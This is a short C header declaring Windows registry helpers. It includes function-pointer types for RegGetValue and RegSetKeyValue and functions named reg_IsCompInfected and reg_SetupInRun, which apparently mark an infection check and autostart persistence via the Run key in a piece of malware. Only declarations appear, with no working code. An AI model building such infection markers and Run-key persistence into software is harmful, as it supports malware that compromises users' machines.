#ifndef __REG_H
#define __REG_H

typedef long (WINAPI *__RegGetValue)(HKEY, LPCTSTR, LPCTSTR, DWORD, LPDWORD, PVOID, LPDWORD);
typedef long (WINAPI *__RegSetKeyValue)(HKEY, LPCTSTR, LPCTSTR, DWORD, LPCVOID, DWORD);

extern int reg_Init(void);
extern void reg_Destroy(void);
extern int reg_IsCompInfected(void);
extern int reg_SetupInRun(char* path);

#endif